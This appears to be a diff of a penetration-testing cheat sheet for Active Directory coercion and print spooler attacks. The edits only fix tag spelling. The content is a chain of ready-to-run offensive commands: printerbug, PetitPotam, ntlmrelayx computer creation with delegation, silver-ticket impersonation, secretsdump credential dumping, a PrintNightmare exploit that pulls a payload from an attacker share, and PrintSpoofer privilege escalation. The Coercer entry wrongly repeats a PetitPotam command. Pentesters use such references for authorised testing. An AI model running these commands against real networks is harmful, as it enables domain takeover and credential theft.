@@ -3,19 +3,19 @@
 % printerbug, petitpotam, Active directory
 
 ## Finding Spooler services listening
-#plateform/linux  #target/remote #cat/RECON 
+#platform/linux  #target/remote #cat/RECON 
 ```
 rpcdump.py <domain>/<user>:'<password>'@<dc> | grep MS-RPRN
 ```
 
 ## Finding Spooler services anonymous
-#plateform/linux  #target/remote #cat/RECON 
+#platform/linux  #target/remote #cat/RECON 
 ```
 rpcdump.py <dc> | grep -A 6 MS-RPRN
 ```
 
 ## dementor
-#plateform/linux  #target/remote #cat/ATTACK/EXPLOIT 
+#platform/linux  #target/remote #cat/ATTACK/EXPLOIT 
 https://github.com/NotMedic/NetNTLMtoSilverTicket
 
 ```
@@ -23,7 +23,7 @@ dementor.py -d <domain> -u <user> -p <password> <attacker_ip> <dc2>
 ```
 
 ## printerbug
-#plateform/linux  #target/remote #cat/ATTACK/EXPLOIT 
+#platform/linux  #target/remote #cat/ATTACK/EXPLOIT 
 https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
 
 ```
@@ -31,46 +31,46 @@ printerbug.py '<domain>/<user>:<password>'@<ip> <attacker_ip>
 ```
 
 ## webclientservicescanner
-#plateform/linux  #target/remote #cat/RECON
+#platform/linux  #target/remote #cat/RECON
 https://github.com/Hackndo/WebclientServiceScanner
 ```
 webclientservicescanner '<domain>/<user>:<password>'@<ip_range>
 ```
 
 ## PetitPotam
-#plateform/linux  #target/remote #cat/ATTACK/EXPLOIT
+#platform/linux  #target/remote #cat/ATTACK/EXPLOIT
 https://github.com/topotam/PetitPotam
 ```
 PetitPotam.py -u <user> -p '<password>' -d <domain> <listener> <target>
 ```
 
 ## Coercer
-#plateform/linux  #target/remote #cat/ATTACK/EXPLOIT
+#platform/linux  #target/remote #cat/ATTACK/EXPLOIT
 https://github.com/p0dalirius/Coercer
 ```
 PetitPotam.py -u <user> -p '<password>' -d <domain> -l <listener> -t <target-ip>
 ```
 
 ## ntlmrelayx add computer
-#plateform/linux  #target/remote #cat/ATTACK/MITM 
+#platform/linux  #target/remote #cat/ATTACK/MITM 
 ```
 ntlmrelayx -t ldaps://<dc1> -smb2support --remove-mic --add-computer <computer_name> <computer_password> --delegate-access
 ```
 
 ## use silver ticket
-#plateform/linux  #target/remote #cat/ATTACK/EXPLOIT 
+#platform/linux  #target/remote #cat/ATTACK/EXPLOIT 
 ```
 getST.py -spn host/<dc2> -impersonate <user_to_impersonate> -dc-ip <dc1_ip> '<domain>/<computer_name>$:<computer_password>'
 ```
 
 ## secret dump with kerberos
-#plateform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
+#platform/linux  #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
 ```
 secretsdump -k <dc>
 ```
 
 ## PrintNightmare
-#plateform/linux  #target/remote #cat/ATTACK/EXPLOIT
+#platform/linux  #target/remote #cat/ATTACK/EXPLOIT
 https://github.com/cube0x0/CVE-2021-1675
 
 - windows server 2019
@@ -85,7 +85,7 @@ CVE-2021-1675.py <domain>/<user>:<password>@<target_ip> '\\<attacker_ip>\<share_
 ```
 
 ## Printspoofer privesc
-#plateform/windows  #target/local #cat/ATTACK/EXPLOIT
+#platform/windows  #target/local #cat/ATTACK/EXPLOIT
 
 https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/PrintSpoofer.NET
 
@@ -94,13 +94,13 @@ PrintSpooferNet.exe \\.\pipe\test\pipe\spoolss <launch_cmd>
 ```
 
 ## Spoolsample launch pipe
-#plateform/windows  #target/remote #cat/ATTACK/EXPLOIT
+#platform/windows  #target/remote #cat/ATTACK/EXPLOIT
 ```
 SpoolSample.exe <target_hostname> <target_hostname>/pipe/test
 ```
 
 ## Spoolsample
-#plateform/windows  #target/remote #cat/ATTACK/EXPLOIT
+#platform/windows  #target/remote #cat/ATTACK/EXPLOIT
 
 coherced authentitication 
 
